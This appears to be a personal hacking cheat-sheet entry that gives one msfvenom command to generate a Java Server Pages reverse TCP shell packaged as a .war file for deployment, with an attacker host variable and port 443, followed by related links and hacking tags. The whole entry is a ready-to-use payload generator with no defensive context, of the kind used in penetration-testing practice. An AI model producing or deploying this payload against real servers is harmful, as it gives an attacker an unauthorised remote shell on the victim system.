# MSFVENOM Java Server Pages (.jsp) As .war
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f war -o shell.war
```

# Related

- [20221003150760](/zet/20221003150760/README.md) MSFVENOM Java Server Pages (.jsp)
- ~/kb/hacking/commands/msfvenom-commands.md

Tags:

    #assorted #command #hacking #msfvenom
